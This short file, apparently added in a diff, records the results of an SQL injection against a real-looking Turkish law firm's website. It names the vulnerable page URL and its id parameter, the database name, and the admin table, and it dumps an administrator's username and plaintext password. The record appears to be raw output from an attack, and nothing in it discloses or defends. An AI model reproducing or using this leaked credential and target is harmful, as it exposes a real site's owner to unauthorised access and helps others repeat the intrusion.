@@ -1,0 +1,10 @@
+VULN URL : http://www.bekirgursoy.av.tr/yeni-guncel.php?id=5
+
+Database: bgursoy_bekir
+Table: yonetici
+[1 entry]
++----+----------+------------+
+| id | username | pass       |
++----+----------+------------+
+| 1  | bekir    | gursoyav61 |
++----+----------+------------+
